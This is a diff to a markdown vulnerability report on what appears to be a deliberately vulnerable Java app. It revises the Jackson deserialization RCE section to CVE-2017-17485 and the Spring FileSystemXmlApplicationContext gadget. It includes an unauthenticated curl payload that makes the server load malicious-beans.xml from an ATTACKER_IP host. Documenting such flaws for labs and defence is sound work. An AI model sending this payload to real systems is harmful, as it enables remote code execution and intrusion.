@@ -13,7 +13,7 @@
 |---|---|---|---|---|---|
 | 1 | [Zip Slip - Arbitrary File Write via Path Traversal](#1-zip-slip---arbitrary-file-write-via-path-traversal) | CVE-2018-1002202 | 6.5 | Medium | `POST /documents/bulk-upload` |
 | 2 | [XStream Deserialization Remote Code Execution](#2-xstream-deserialization-remote-code-execution) | CVE-2013-7285 | 8.8 | High | `POST /report-template-upload` |
-| 3 | [Jackson Polymorphic Deserialization Remote Code Execution](#3-jackson-polymorphic-deserialization-remote-code-execution) | CVE-2019-12384 | 9.8 | Critical | `POST /api/sync/bank-feed` (Unauthenticated) |
+| 3 | [Jackson Polymorphic Deserialization Remote Code Execution](#3-jackson-polymorphic-deserialization-remote-code-execution) | CVE-2017-17485 | 9.8 | Critical | `POST /api/sync/bank-feed` (Unauthenticated) |
 | 4 | [Log4Shell Dependency Note](#4-log4shell-dependency-note) | CVE-2021-44228 | 10.0 | Critical | `POST /login` (Audit Logger) |
 
 ---
@@ -118,26 +118,27 @@ ls -la /tmp/xstream-pwned
 ### 3.1 Summary
 | Attribute | Value |
 |---|---|
-| **CVE ID** | CVE-2019-12384 |
+| **CVE ID** | CVE-2017-17485 |
 | **CWE** | CWE-502 (Deserialization of Untrusted Data) |
 | **CVSS Base Score** | 9.8 (Critical) |
-| **Vulnerable Library** | `com.fasterxml.jackson.core:jackson-databind` version `2.9.8` |
+| **Vulnerable Library** | `com.fasterxml.jackson.core:jackson-databind` version `2.9.3` |
+| **Fixed Version** | `jackson-databind` version `2.9.3.1` |
 | **Access Requirement** | **Unauthenticated** (`/api/sync/bank-feed`) |
 
 ### 3.2 Root Cause
-This vulnerability exists due to three factors:
+This vulnerability exists due to two factors:
 1. `BankTransactionEvent.java` uses `@JsonTypeInfo(use = Id.CLASS)` to allow dynamic polymorphic deserialization.
 2. `BankSyncService.java` creates an `ObjectMapper` without `PolymorphicTypeValidator`.
-3. `GatewayExtensionDeserializer.java` reads `@type` and uses reflection (`Class.forName` and `Constructor.newInstance`) to instantiate target classes.
 
-By passing `org.springframework.context.support.ClassPathXmlApplicationContext` as the target class, Jackson fetches a remote Spring XML bean definition over HTTP and instantiates it. 
+In `jackson-databind` version `2.9.3`, the Spring `ApplicationContext` gadget classes (`org.springframework.context.support.FileSystemXmlApplicationContext` and `ClassPathXmlApplicationContext`) were not yet added to Jackson's internal `SubTypeValidator` blacklist (the blacklist was updated to block these classes starting in version `2.9.3.1`).
+
+By specifying `org.springframework.context.support.FileSystemXmlApplicationContext` in the `@class` property, Jackson instantiates the bean context using the supplied HTTP XML configuration location, fetching the remote XML definition and executing arbitrary code during instantiation.
 
 **Why this works on Java 11**: Unlike LDAP/JNDI lookups (which are blocked in Java 11 by `trustURLCodebase=false`), this gadget uses HTTP XML loading via Spring Framework, bypassing JVM JNDI restrictions completely.
 
 ### 3.3 Affected Source Files
-- `pom.xml`: `<jackson.version>2.9.8</jackson.version>`
+- `pom.xml`: `<jackson.version>2.9.3</jackson.version>`
 - `src/main/java/com/happy/simipkit/model/banksync/BankTransactionEvent.java`
-- `src/main/java/com/happy/simipkit/deserializer/GatewayExtensionDeserializer.java`
 - `src/main/java/com/happy/simipkit/service/BankSyncService.java`
 - `src/main/java/com/happy/simipkit/controller/BankSyncController.java`
 - `src/main/java/com/happy/simipkit/security/AuthenticationFilter.java` (Excludes `/api/sync/*` from auth)
@@ -167,13 +168,8 @@ Start HTTP server: `python3 -m http.server 8888`
 curl -X POST http://<target>:8080/simipkit/api/sync/bank-feed \
   -H "Content-Type: application/json" \
   -d '{
-    "@class": "com.happy.simipkit.model.banksync.SaldoUpdateEvent",
-    "bankPartnerCode": "BCA",
-    "referenceNumber": "REF-1001",
-    "gatewayExtensionData": {
-      "@type": "org.springframework.context.support.ClassPathXmlApplicationContext",
-      "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
-    }
+    "@class": "org.springframework.context.support.FileSystemXmlApplicationContext",
+    "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
   }'
 ```
 
@@ -208,7 +204,7 @@ On Java 11, the JVM default setting `com.sun.jndi.ldap.object.trustURLCodebase=f
 |---|---|---|---|---|---|
 | 1 | Zip Slip | CVE-2018-1002202 | 6.5 | Yes | Path traversal entry in ZIP file (`../`) |
 | 2 | XStream Deserialization RCE | CVE-2013-7285 / CVE-2020-26217 | 8.8 | Yes (Admin) | `EventHandler` + `ProcessBuilder` XML proxy |
-| 3 | Jackson Polymorphic RCE | CVE-2019-12384 | 9.8 | **No** | Dynamic reflection of `ClassPathXmlApplicationContext` via HTTP |
+| 3 | Jackson Polymorphic RCE | CVE-2017-17485 | 9.8 | **No** | Dynamic reflection of `FileSystemXmlApplicationContext` via HTTP |
 | 4 | Log4Shell Note | CVE-2021-44228 | 10.0 | **No** | Pinned vulnerable Log4j2 dependency note |
 
 ---
